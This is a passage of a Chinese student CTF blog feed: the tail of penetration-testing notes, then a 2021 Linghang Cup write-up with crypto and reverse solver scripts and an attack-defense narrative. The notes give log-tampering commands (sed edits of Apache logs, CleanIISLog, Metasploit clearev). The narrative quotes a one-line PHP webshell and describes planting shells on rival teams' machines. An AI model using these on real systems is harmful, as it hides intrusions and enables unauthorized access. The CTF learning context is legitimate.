options.USERNAME, options.HOSTNAME, options.TTYNAME , options.DATELINE)</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            parser.print_help()</span><br></pre></td></tr></table></figure><h3 id="Web日志"><a href="#Web日志" class="headerlink" title="Web日志"></a>Web日志</h3><h4 id="Apache日志"><a href="#Apache日志" class="headerlink" title="Apache日志"></a>Apache日志</h4><blockquote><p><code>find / -name *access*log</code> 搜索全部日志<br><code>sed –i ‘s/192.168.122.18/192.168.122.17/’ /var/log/httpd/access.log</code>  将访问IP为192.168.122.18的地址替换为192.168.122.17<br><code>sed–i‘/192.168.122.17/’d /var/log/httpd/access.log</code> 删除访问IP为192.168.122.17的记录</p></blockquote><h4 id="IIS日志"><a href="#IIS日志" class="headerlink" title="IIS日志"></a>IIS日志</h4><p>CleanIISLog</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CleanIISLog.exe u_ex201008.log 192.168.122.18</span><br></pre></td></tr></table></figure><p>用工具就行了，略</p><h3 id="Windows日志"><a href="#Windows日志" class="headerlink" title="Windows日志"></a>Windows日志</h3><p>利用MSF</p><blockquote><p><code>runevent_manager –i</code> 查看日志及其配置信息<br><code>clearev</code> 清除系统日志</p></blockquote><hr><p>好！学完啦！撒花！（悲</p><h1 id="垃圾卓越班"><a href="#垃圾卓越班" class="headerlink" title="垃圾卓越班"></a>垃圾卓越班</h1><p>如题，垃圾卓越班，狗都不来（</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;内网渗透笔记&quot;&gt;&lt;a href=&quot;#内网渗透笔记&quot; class=&quot;headerlink&quot; title=&quot;内网渗透笔记&quot;&gt;&lt;/a&gt;内网渗透笔记&lt;/h1&gt;&lt;p&gt;大一脑子进水报了卓越班，放暑假了还在这坐大牢，做一天和尚撞一天钟，记个笔记让我这个月有点收获吧（&lt;/p&gt;
&lt;</summary>
      
    
    
    
    <category term="Web" scheme="http://example.com/categories/Web/"/>
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>2021领航杯 &amp; 蚌埠住了</title>
    <link href="http://example.com/2021/10/09/2021%E9%A2%86%E8%88%AA%E6%9D%AF/"/>
    <id>http://example.com/2021/10/09/2021%E9%A2%86%E8%88%AA%E6%9D%AF/</id>
    <published>2021-10-09T15:09:20.000Z</published>
    <updated>2021-10-09T18:45:26.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2021领航杯"><a href="#2021领航杯" class="headerlink" title="2021领航杯"></a>2021领航杯</h1><h2 id="初赛"><a href="#初赛" class="headerlink" title="初赛"></a>初赛</h2><p>比赛时间六小时，平台存活时间5分钟，哥们手里全是flag，全程刷新平台尝试提交，而且整个一江苏省赛，连个比赛群都没有，只有个指导老师通知群</p><p>懂了，这是对自身题目质量的自信和对学校指导老师的信任，贵比赛必定题目质量极高</p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="ECC"><a href="#ECC" class="headerlink" title="ECC"></a>ECC</h4><p>爆破，可以中间相遇减少点时间<del>（抄别的比赛的题，结果自己改题的时候还有语法错误</del></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="number">64464091191308356774703439660771627086045800299627641179047457478059588557461</span></span><br><span class="line">a = <span class="number">31926335967105564755113987930261069322507794703287741857397622356704769886356</span></span><br><span class="line">b = <span class="number">34835808070187351680507689900273321615070127680320357724483770400791707112940</span></span><br><span class="line">Gx = <span class="number">2053202552422630348010474635096983783565667661786369125783579647572276572403</span></span><br><span class="line">Gy = <span class="number">51320753844844801021362329076409450910659564359017581255542897537756778371539</span></span><br><span class="line">Zp = Zmod(p)</span><br><span class="line">EC = EllipticCurve(Zp, [a, b])</span><br><span class="line">G = EC(Gx, Gy)</span><br><span class="line">K = EC(<span class="number">31981799071949968743482831587417174146463993877255771340814476669214408840460</span>,<span class="number">15144025062588325012239455117890516531350002058200271280110877844265896081387</span>)</span><br><span class="line"></span><br><span class="line">Da = [<span class="number">4</span>,<span class="number">3</span>,<span class="number">1246057</span>,<span class="number">2357351</span>,<span class="number">435374689</span>]</span><br><span class="line">Db = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">1016839</span>,<span class="number">813641</span>,<span class="number">35993350</span>]</span><br><span class="line">kn = crt(Db,Da)</span><br><span class="line">n = <span class="number">4</span>*<span class="number">3</span>*<span class="number">1246057</span>*<span class="number">2357351</span>*<span class="number">435374689</span></span><br><span class="line">set = &#123;(n*i*<span class="number">1500</span>+kn)*G:i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1500</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1500</span>):</span><br><span class="line">    C = n*i*G+K</span><br><span class="line">    <span class="keyword">if</span>(C <span class="keyword">in</span> set):</span><br><span class="line">        k = <span class="number">1500</span>*set[C]*n+kn-n*i</span><br><span class="line">        print(long_to_bytes(k))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="BMC"><a href="#BMC" class="headerlink" title="BMC"></a>BMC</h4><p>有工具，一把梭<del>（github下载之后，点开即送flag</del></p><p><a href="https://github.com/0xTowel/BMC-Viewer-Backup">https://github.com/0xTowel/BMC-Viewer-Backup</a></p><h3 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h3><h4 id="GetFlag"><a href="#GetFlag" class="headerlink" title="GetFlag"></a>GetFlag</h4><p><del>哥们不懂二进制，只是听说很tm水</del></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">key  = list(<span class="string">&quot;123456789getflag&quot;</span>)</span><br><span class="line">c1 = <span class="string">&#x27;abcdefgh13462579&#x27;</span></span><br><span class="line">c2 = <span class="string">&quot;ccccebeebbeafbeeeabefabfaffffafaafaaea4b292he31922g6d54a62hchf2bb9ehagdc&quot;</span></span><br><span class="line">output = <span class="string">&#x27;&#x27;</span></span><br><span class="line">tmp1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c2:</span><br><span class="line">    output += hex(c1.find(i))[<span class="number">2</span>:]</span><br><span class="line">listput = list(output)</span><br><span class="line">tmp1 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">36</span>):</span><br><span class="line">    tmp1.append(((int(listput[i],<span class="number">16</span>) &lt;&lt; <span class="number">4</span>) | (int(listput[i + <span class="number">36</span>],<span class="number">16</span>) &amp; <span class="number">0xf</span>)))</span><br><span class="line">v0 = list(<span class="string">&#x27;a&#x27;</span> * <span class="number">36</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">36</span>):</span><br><span class="line">    v0[<span class="number">35</span>-i] = tmp1[i] ^ ord(key[i % <span class="number">16</span>])</span><br><span class="line">inside = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">36</span>):</span><br><span class="line">    inside.append(v0[i] ^ i)</span><br><span class="line">flag =<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> inside:</span><br><span class="line">    flag += chr(i)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>略</p><h3 id="一些不是重要但是又很有趣的东西"><a href="#一些不是重要但是又很有趣的东西" class="headerlink" title="一些不是重要但是又很有趣的东西"></a>一些不是重要但是又很有趣的东西</h3><blockquote><p>比赛公告：本次比赛采用动态flag反作弊监控技术，经组委会发现比赛作弊或对比赛平台产生攻击行为，将采取禁赛、直接取消成绩等处罚措施，希望各位选手严格遵守竞赛规则……</p><p>现实：比赛刚开始平台就给人日烂了，变成了群文件做题，三题定天下（</p></blockquote><p>一句话总结就是：CTF解题大赛（×    exp搜索大赛（√    flag提交大赛（√</p><h2 id="决赛"><a href="#决赛" class="headerlink" title="决赛"></a>决赛</h2><p>看了眼决赛居然是awd模式，我还在寻思这主办方还能办awd？而且是听说没有pwn的awd，抱着看热闹的态度还是选择去线下看看<del>（主要是综测得时候能加点分）</del></p><p>为了给大家带来身临其境的感受，我决定跟大家分享我的生活，时代都进步了，给大伙整点AR体验</p><h3 id="赛前"><a href="#赛前" class="headerlink" title="赛前"></a>赛前</h3><p>先让大家和我一起登录我的微信</p><blockquote><p>很久很久以前</p><p>xxxxx比赛将于xxxx举办xxxxxx……</p><p>[比赛座次示意图]<img src="https://s3.bmp.ovh/imgs/2021/10/34f092d6650b37bc.jpg"></p></blockquote><p>先不说画质有多离谱，反正这图我是看不懂的，一个队三个人你整四个座</p><p>懂了，第四个是给指导老师休息的是吧，彳亍，这么人性化的安排，我直接好评</p><blockquote><p>10.8下午2:16</p><p>我：老师 明天我们线下赛是可以连接外网吗？</p><p>我：另外线下采用的是awd还是awdp模式呢（就是给不给流量</p></blockquote><p><del>（石沉大海）</del> 行吧，不理我就不理吧（</p><blockquote><p>10.8下午2:22</p><p>老师：明天请各位同学11:30在西区主楼前集合，一起乘车前往，请相互告知@xxxx（我们队唯一的女生）</p><p>老师：@xx（我）@（另一个男生）</p><p>我：收到</p><p>（过了十几分钟）</p><p>老师：组委会表示不允许连接外网</p></blockquote><p>好家伙？居然理我了？那这必须得抓住时机多问点</p><blockquote><p>我：那比赛模式呢</p><p>我：比赛会给流量吗</p><p>（又过了十几分钟）</p><p>老师：[截图]（很久之前发过的红头文件）</p></blockquote><p>哥们是没有你这红头文件是吧，确定一下主办方有没有流量都这么难是吧</p><blockquote><p>我们队唯一的女生：西区主楼在哪0.0</p><p>（秒回）</p><p>老师：就是一号楼</p><p>老师：最高的[表情]</p><p>我：意思是没有流量是嘛</p><p>我：那还有个问题是</p><p>我：这次的线下平台承办方是谁呀</p></blockquote><p><del>（石沉大海2.0）</del>？啥意思啊？当我不存在是吧？<del>怎么进的线下没点B数吗？</del></p><p>10.9 前往赛场</p><p>做老师的车过来，<del>路上玩手机给我玩晕车了（</del>，半路上看了眼比赛场地，只看见场地在好高级的酒店里头，附近还有好多的小吃店</p><blockquote><p>鬼鬼，这么有钱能租到这么豪华的场地，平台辣鸡不辣鸡无所谓，哥们能有茶歇吃就行了，要是平台烂了更好，哥们直接住在茶歇，变成茶歇区第一老带哥（逃</p></blockquote><p>好奇心驱使着我偷偷溜进去看了一眼场地，在门口左看右看，看了半天没瞅见摆吃的的地方</p><blockquote><p>完蛋，awd没茶歇，快乐少一半</p></blockquote><p>等了半天等到指导老师买了点吃的和咖啡回来，门口吃完了之后就进比赛场地了</p><p>初入大厅，迎面有个巨大无比的带屏幕，在看看隔离带旁边有群不合群的四五个小伙子，看看胸前的牌子，原来是由五人组成的专业运维组，不过我没想多少，便打算去找自己的位置看看平台长啥样</p><p>哥们进去想着哥们初赛是第一，座位应该是离带屏幕最近的哪个角上坐着，于是直接奔着离大屏幕最近的角大步前进，走过去一看，居然的学校，哥们于是自信回头，想着哥们应该是另外一个角，背着包就往那冲，再定睛一看，上面清清楚楚写着几个大字<code>xxxxxx有限公司</code>，奇了怪了，于是我开始环顾四周，大厅找了个遍，终于在离屏幕最远的小角落里找到了<code>南京航空航天大学</code>字样，于是便赶紧招呼着几个队友坐下了</p><blockquote><p>？啥意思？？哥们初赛第一做最远的小角落？</p></blockquote><p>再仔细想了想，好像我离运维近一点，有啥问题应该属于是头一个解决的，属于是主办方对哥们的特别优待，那也彳亍，于是便找了小角落的桌子的最角落的座位坐下了</p><p>过了一会过来一小姐姐，直接和哥们开始对话</p><blockquote><ul><li>“你好，我们这个位置不能做人的”</li><li>“为啥，你们这一共四个座为啥不能坐”</li><li>“我们桌子上放这个牌子这里是不能坐人的”</li><li>“彳亍，那我这就走”</li></ul></blockquote><p><del>哥们是座山是吧？坐在那就能给你那么大的牌子挡住了？</del></p><p>想了想说的也是，这么大的比赛，还请了这么重要的领导，总得把面子工程做到位，一定支持主办方的安排，是我情商太低了，即刻深度反思</p><p>座位调整完了之后，调了调地址啥的就能连上平台了</p><p><img src="https://s3.bmp.ovh/imgs/2021/10/8bbbe66a1fd13c56.png"></p><blockquote><p>第一眼，这平台看着还挺好看？</p><p>再看一眼，确实好看，而且这HardCccc应该是个pwn题，我们pwn手有事干了（窃喜</p><p>总觉得哪里少点啥，再看一眼，nm，token都给我了，只能手动交flag？</p></blockquote><p>为了避免我个人以小人之心度君子之腹，于是哥们请教了众多运维小哥哥中的几位</p><blockquote><p>我：咱们平台有flag提交的api吗？</p><p>A：（疑惑脸）啥？</p><p>（我们俩看向B）</p><p>B：（故作镇定）怎么啦，平台有什么问题吗？</p><p>我：咱们平台flag提交的api在哪里呢？</p><p>B：（疑惑脸看向A）啥？</p><p>A：你说的是啥意思？</p><p>我：（无奈）咱们平台这个只能手动提交flag吗？</p><p>A：是的是的</p><p>B：手动交，要手动提交的</p></blockquote><p>这波啊，这波是我不懂事，明明主办方写平台都那么辛苦了，我居然还要求用api提交，<del>罪该万死</del></p><p>小事而已嘛，哥们自己改改脚本不就好了，找主办方的麻烦属于是我在这挑刺</p><p>帮队友调完ip之后，突然瞄见了自己前一天晚上写的<code>flowcopy.py</code>，于是打算起身去到运维组问问比赛给不给流量</p><blockquote><p>我：那个，我想问一下，咱们比赛的时候给流量吗</p><p>A：（看向B）他问给流量吗？</p><p>B：（不解）啥流量？</p><p>我：就是交互流量啊</p><p>B：有的，有的，都是能访问到的</p></blockquote><p>有人在致敬，但我不说是谁（逃</p><p>座位上发了会呆聊了会天，听主持人说了半天才知道，今天这比赛分两部分，高职组是解题，本科组是攻防，但大家坐在一个大厅，<del>说了半天什么谁可以联外网，谁不能外网……反正说了一大堆也没听懂</del></p><p>于是干等了一个小时比赛就开始了<del>（好像有哪个领导讲了点话，还宣布了比赛开始好像？</del></p><h3 id="比赛期间"><a href="#比赛期间" class="headerlink" title="比赛期间"></a>比赛期间</h3><p><strong>一句话总结：欢迎大家来到仙界！</strong></p><p>俩web一pwn，有半小时的加固时间，打算先去备份源码，下载完了之后打算看一眼主页长啥样，地址一输，俩题打开都是迎面而来的<code>Index of /</code>，于是哥们果断举手，结果主办方坚定的告诉我这题就这样，我心想完蛋了，这下web题都看不懂了，这不是得给达成筛子？算求，看不懂就看不懂，哥们只管打人就行了</p><h4 id="web1-SuperOA"><a href="#web1-SuperOA" class="headerlink" title="web1 SuperOA"></a>web1 SuperOA</h4><p>半小时加固时间一过，去看看别人的站长啥样，地址一访问之后给我看傻了，别人的站都有是模有样的登录界面，就我们是个空站，哥们于是自信举手跟运维组反应</p><blockquote><p>“您好，我们的环境和别人的不一样”</p><p>“啥意思？”</p><p>“你看我们的站一个php文件都没有”</p><p>“……”</p><p>“这个现在的index还是我自己写上去的”</p><p>“那你这就把index覆盖了啊”</p><p>“不是，我们这一个php都没有，我自己闲的没事干把自己站删了？连主页都没有不是要给check down？”</p><p>“……没事，你这文件夹都在，你继续加固就行”</p><p>“？这难道不是你们的问题？”</p><p>（转头离开）</p><p>“主页都没有你告诉我让我加固？”</p><p>（走远了）</p></blockquote><p>经过了多次尝试，确实发现是一点办法都没有，于是扣了50分重置，结果重置完我们自己的账号没权限，然后运维又调了好久我才有权限备份和上传，<del>（上面已经全是来自各地的🐎了）</del>，然后上了个waf，一打开，鬼鬼，警告日志直接给我弹满了，然后挂着waf抄流量，打了一圈之后我发现人均watchbird<del>（？真就waf大乱斗？</del></p><p>抄了几个payload，发现还是有憨憨没上waf，反正薅羊毛，大家一起薅</p><p>然后回服务器上准备删马，随手cat了几个看看都长啥样，突然看见有个<code>shell.php</code>，cat出来，直白的写着<code>eval($_POST[&#39;1&#39;]);</code></p><blockquote><p>？？？？？？？？？？？？？？？？？？？？？？？？？？？？？</p><p>现在人种马都不带密码的？</p></blockquote><p>反手骑着别人的马把自己的马种了上去，这波啊，这波是瞎猫碰见死耗子，<del>然后有了自己的马之后就为所欲为了</del>，20个队给我种上了9个，这位老哥属于是带功臣（逃</p><p>有个功能全开的waf在，基本全给拦下来了，最后就剩下几个删不掉的不死马，但是我也没办法了（</p><h4 id="web2-Baseflask"><a href="#web2-Baseflask" class="headerlink" title="web2 Baseflask"></a>web2 Baseflask</h4><p>这题更是有意思，从头到尾整个站都是空的，<del>里面除了别人的shell再啥也没有（？</del></p><p>我看了半天实在是不知道要怎么搞，然后没办法，反手来一个<code>find / -name &quot;*.php&quot;</code>，结果整个服务器上啥也没有，然后随手敲了个<code>find . -name &quot;*flag*&quot;</code>，突然发现除了flag文件还有个二进制文件叫<code>readflag</code>，于是下载下来拖进IDA看了一眼，伪代码大概如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">freopen(&#x27;/flag&#x27;,&#x27;r&#x27;);</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; flag;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; flag;</span><br></pre></td></tr></table></figure><blockquote><p>？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？</p><p>这又是个啥？这不是web题吗？</p></blockquote><p>然后看了一眼参赛手册，上面写着**”系统开放端口则需自行查看”**，于是哥们赶紧叫队友扫一下靶机开了哪些端口，有个9999，反手一连直接弹出来了个flag</p><p><del>nc就送flag，端口不回收，nc自由，我系Dawn_whisper，十月九日下午两点，和我一起大战领航杯（雾</del></p><blockquote><p>？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？</p><p>web题为啥给我开了个TCP服务？还是直接给flag那种？</p></blockquote><p>叫pwn手修好了之后，试着拿这种办法打一下别人的机子，好家伙，不打不知道，一打吓一跳，哥们一分钟写出来的exp，一次性打了17个flag（如图</p><p><img src="https://s3.bmp.ovh/imgs/2021/10/f5d4fc0cb33a1c26.png"></p><blockquote><p>？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？</p></blockquote><p><del>这exp直到最后一轮都还能打17个靶机，我严重怀疑这是pwn题（</del></p><h4 id="pwn-HardCccc"><a href="#pwn-HardCccc" class="headerlink" title="pwn HardCccc"></a>pwn HardCccc</h4><p>四个小时，全场零解，我的评价是：寄！</p><h4 id="关于平台"><a href="#关于平台" class="headerlink" title="关于平台"></a>关于平台</h4><p><del>只能说，除了看起来还行，没有一点点优点</del></p><p>连一次自己靶机要一分钟，上去就看见CPU利用率98%<del>（麻了</del>，然后自己还没权限<del>（麻中麻</del></p><p>本平台极度流畅，因为只要你访问太多次就判断你是恶意攻击</p><p>本平台极度友好，因为你根本看不到自己靶机有没有被打</p><p><img src="https://s3.bmp.ovh/imgs/2021/10/50960cdbe6244e67.png"></p><p>本平台极度智能，因为该平台可以随时生成奖状，自己需要即刻随时下载</p><p><img src="https://s3.bmp.ovh/imgs/2021/10/61e4f84cc51f4bec.png"></p><p>本平台极度负责，因为我们根本不进行题目check，所以根本不会有人被check down！</p><p>下午四点多哥们就发现自己web1的MySQL库又给别人扬了，但是还没check down，直到比赛快结束了才进行了人工check扣分，而且根据主持人所说，”扬了数据库属于违规行为，需要你们溯源，找到是谁扬了你们的数据库他们就会被扣除一千分”</p><blockquote><p>？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？</p><p>自己没修好被扬数据库算违规？而且还靠选手溯源找凶手（高，实在是高.jpg</p></blockquote><h3 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h3><p>全程靠waf大乱斗和几个马，还有理解不了的nc拿flag，迷迷糊糊打了个第五，<del>混了个二等奖（？</del></p><h2 id="赛后"><a href="#赛后" class="headerlink" title="赛后"></a>赛后</h2><p>微信推送</p><blockquote><p>本次竞赛由江苏天创科技公司自主研发的产品“天创红客训练营安全攻防实战竞赛平台”提供技术平台支持。</p><p>CnHongKe平台已广泛应用到政企单位以及各大赛事的平台支持中，帮助政府、金融、通信、公共安全、能源等关键信息基础设施行业选拔网络安全人才，培养更多网络安全技术人员，江苏天创红客训练营将继续打造国内公益赛事，为提高国内红客人员技能贡献微薄力量！</p></blockquote><p>我只能说，____</p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>蚌埠住了，还是蚌埠住了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2021领航杯&quot;&gt;&lt;a href=&quot;#2021领航杯&quot; class=&quot;headerlink&quot; title=&quot;2021领航杯&quot;&gt;&lt;/a&gt;2021领航杯&lt;/h1&gt;&lt;h2 id=&quot;初赛&quot;&gt;&lt;a href=&quot;#初赛&quot; class=&quot;headerlink&quot; title=&quot;初</summary>
      
    
    
    
    <category term="Life" scheme="http://example.com/categories/Life/"/>
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="AWD" scheme="http://example.com/tags/AWD/"/>
    
    <category term="Life" scheme="http://example.com/tags/Life/"/>
    
  </entry>
  
  <entry>
    <title>AWD框架</title>
    <link href="http://example.com/2021/06/26/AWD%E6%A1%86%E6%9E%B6/"/>
    <id>http://example.com/2021/06/26/AWD%E6%A1%86%E6%9E%B6/</id>
    <published>2021-06-26T11:42:06.000Z</published>
    <updated>2022-03-30T08:23:42.000Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="e7ff5aa6b4cff35feee2631f65aee47ad20b1363dddc3f2571feeb5a35a32883">18c28b7435ad413414fae5c4e7392415fef5d21d70ae6608b3875c77f23b34c4ea8517b8741363af6be728ef131bca796e9d364f2a6f7d1d574bdf28fee440ad8bcc7c97a2bcb1139be04f9dcf4f6baa1acea157ee01c9a346a50b4ab622d359dda751e6b80bf5fcb9e2c9fa19465d1f92c07e2bc31a15c33639e234a231c7233cd72f77bbd803c14910d0713ed75a4e58e9f57e533ec85a5603a0ba17e795d8289d505db00608c012296b89004e6be6029e7a318587ee1dd04a31dc65e5e3a7a9ba47f41b0992579382309303d7d5e4055761405bad62e17d7a1dd10a6f343f19955cf5569c2b33a5ce1e45c95af275214beec7e5dbacfba81e8c671c9c281ba0be71498d7172b8c8d95dfa8ae232a614963dd2c59be1cd1114209038934afc966920b893f88cbf73c69c38996094a6ee836312630a1776220fb3061d0bd4a41ec57afd64d063a92163f98ed58996eb2e514ca8121e2d78f97f1177ac2535ca0f20ac84a866b3f7e6dfd1d544af1476a1d8ba573d20121a1bc716cb8508794c35df332cccb0b12e8b28d5810421f2d7cf907462700e1a664894e69d6cb9754dfb63cb2d0a74fccc2c17323fc10fabf9eec675357dbda893d03ef01c46aefd9e330ebdda4b7ea45125f29bb7388eb11c2cb6a003fb1781ae63bcfd41e6d55e031c87e4b1d97fc1856130b29e886953c88886e2a350cddf5c460ed4c662151c8722bc9ed8dd2564b659c808f052d747990ef2c075eb152705d8cbdaafe0bea01c8eb5868cac7a6c05948c6fd691a21ad54c86fa70331e9b9baada13d85cb5af1f4b12fc2a78edc3f559a58582e8e982d3cf4efc04b789f316faa11050eb712e7b964d637804804e81154069e1d170d97c0ffc0707fa24325d7071ba9929e9c8dc627f63395d50a1cf615a2c9494d6d7f8a959a7f678ca8de02297204c11b0eb8a76921fe507730030648715308bbf7dedae2834f40803f3fe79b4f38d61dbc9f36a66d0ca186363696ad941a43e547700f60a00e004395b1f529954de003c5c338e64e274b725e6df2a7a8c754bff09995fc65cdc52714021178caa81f423b72b6560be22077f722b6627466ed28f5443df0e24f60dd15c63c616160ca8d394ad2d0f865b2609c547892cad6e210e6ff08a85baa4dbeb0ff4173e869650d575d27f20f62223a81f9352379a372dcc53a77319b1aa3539081fabf307b1c47513da4825612ac0f4fd44fc1508cdd1cdbe913584e9829a59bd9bceeed683b936ba43c364fb09e67e3034b12c32588b01dec552361bc9497dff777a96b2158908007955e1592581b6ed49fbb9ca8f162c325999853df4bcca8f0a95b7a2af8ea194f3f26cc96fc7172b6881370c99ef389eea7a1ddc746aaa79caabf05e89f5b3da7d0b832978ef3928e9a8b9bce69dc663328aaa34bf5d02f1e0235bce2010dba13eb8c2ba2f9a385718f7ddd2ee26965aecd6204511417194d61efa29cef681e39fac0a2df3d4aa215ce75511e00f494e31f0600b4982aaf367d9d7a4668f612b8f0c9cafd0f0bfeda188ab0381f49b9aec70a4099593b4a152a29ecef31b41cb716bfcf1f6b29f8939288f5c1a3aeadfae73546d5e1868e73d5a1e7f7e8935ea3ef51dcf4f9b81e7b74c4c2b7444b974df4bbda96629665ba9530aaea9abf9b79fc4fdf19c2e060ccb57c79cfdad20194c7767528eb14141a7ebe5dc9ac0824ffadc86b953b63f807206cfbbf15765a2bbeff4e9601ea67e2facaeb1d44326b5a6eef72fb97fee052e0ddc1cf8aaf9f2b806e26e736947662872c4a6a79c92ca557e8d32c188e4f0246dee4fe99189867766af7d56d53a6514daa776a5009427f962442052ba35395a434bcdccf71bff9808337f13550f409f4c071b223c81af7f0f36835d7b0f39088eaab5ee00672312ba6cd7ce49403d84dddcdb23b6c5dd5cfff4b12e05fbf4621d6eef922fb24278adec2f99dd6e68a4c5fa08b2d2843629dcfffa0477daaa713df882e2b0f7ddb550a7ef05aeeb463829371e6aad4b2c1734dbc325ac65c868ecf43f42069df9c9707b65f662263e2b8a9dece427061c5e0b162d9db0a1c4e6988cd87ee1e477c69685fab2cc875bc031d1cfc2adb26d0e9dd9fffb49adf17fd06898266e19775b723a31e8e867425f2bfad57c1402131736857ba36ff2564c7c5a583ab1388ee6e355dc507b544aaae1867880928da6baacc778aac8fc1851f558666abca971e148b390a9ca4648a9120f5207bfc1be11a8a5c1886db11e68786347a5f129a09e8e18dc30daede3e9fd07af2c108b28bf1882f50ea99a34be4452f47a5b32bd6aee7a105f291f5e1f607c6e015067d057e19170873b4b39eddace7f0bd73e31089811bc938a3244fd481fb95cd017c323d2b7baa842f0c16d4de6a9660510d811fecb95c7b19657cae44088eeb3a39e663dad6223d0f754ee8364660ad01afbee595aa2ebe5cdfad65373c93589c78f24700f8350422de9bd2ebd25c68d290b411e64a64ce1356fc07e871807eb11c5c53b3b4a73ffcdb4e5edd490faa19f9efa43932b83a3a6aa794d93b3f75576387c9e8414714c18a9a49e8e7d92ff6967b484f2a957239fe800277694733097dd4ee59ad6f85947a9fbe821ceab151038a876a7db4bd7960eb233caf182766fd6d93c153b8e1788633d84208c0479bd4130fee8ebe2e4db348b521aaf674ddaa39f8d19dbfef98047d0399e2bf1dd54eee3cb460587e6233b93b2ef10b979f504bee513e60735ea04b511b8461e6a684aed445ba68b5ef76313b3e3f8ad613a6b193f6b9fef783bd1614d3d61d0f4db807634032172e4cfb9d9aa8259c253452865672ae60a60726213a087ae4fdfb3897ff936f098a60bfea3d8e18f3d25698835de53d5b40c4672b06dd4f57b399d7354e216f509fd0737585b86dc08b8086f551ac7a5166fb34fb47a174ddd77916dd4a1aaf4b43b33843899d598aed171abde0b1956e1ec6fe92727c058ba5457dc46329d4b0ecb498857960857e1e2d1ccc7195db1f2b550a6e841b078bfd01a34abef76e277e2b52af05e0c656f5ec98b9fc6070b573de70d220ceb60b28e4dc92be048c2bbe9a029864c84bd2215ad4bacd6919b77d9b73e76bf6f74433727f13362d1d4a709c21278c692007e1dd53f1c60238e97b027fdc223d1f1b01712a364708480d440952f3d3b78517829ba35d55180e40060b5eb2ba42c567921628e7e5ec5fb9fdf9f12e13a32706a31e2967c1001e860de0f9e4fb16e456bc471f11a65fd6ec2593b06a4211f0c38f8bdb716f9248f322b24f966caef355cfc39dcd7563d88a6cf3ffc074100419ec6b857601cf7fd58951ac26c1758768ab5130fcd4e555bef5f1f08da29373d4797c6a47d914e24f97d78351dacc2830258fecab481f02a52365dd01a7e1bc857fd7baafe54021a9ce4d7db56dc94c62d9d1619956304dd0e231b50b4dd0b3838a0fc3d5629e755f4990406e1e3ece4ddfe77b72d3e90be21abadb85cfd6dcbacfb310417d582e82ad0c02f8a1be5db7b91f88ff85db83353645e8105a04b3413ccdebecfa55bca8f66c11d2b74232de31ddc224942a08a9600b314e07e408a2dbfb841b08a75cfb9a824f53fca898f0a55f5faccf1a4f5e154f0b7bb5ec211a754dc1b2ca4fe529139b2c316651b482e7db249441212f3db6f4b21247721e23883a138de666d3b7e01f28890d8b7eb760f2ba4079a8884960a5b7483bb975ab69e2cec77296e3f8c92a62581eb4c10dbb5670f6cd49aac2c6adb834821df0a735b2b7d53bef7